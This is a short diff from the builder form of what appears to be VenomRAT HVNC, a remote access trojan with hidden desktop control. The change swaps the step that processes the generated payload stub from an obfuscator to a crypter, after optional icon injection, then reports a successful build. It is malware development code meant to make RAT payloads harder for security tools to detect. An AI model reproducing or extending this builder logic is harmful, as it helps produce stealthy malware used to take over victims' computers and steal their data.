@@ -251,7 +251,7 @@ namespace VenomRAT_HVNC.Server.Forms
                                 {
                                     IconInjector.InjectIcon(saveFileDialog.FileName, txtIcon.Text);
                                 }
-                                Obfuscate.Run(saveFileDialog.FileName);
+                                Crypter.Program.Run(saveFileDialog.FileName);
                                 MessageBox.Show(@"Stub Successfully build!", @"Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                                 SaveSettings();
                                 Close();
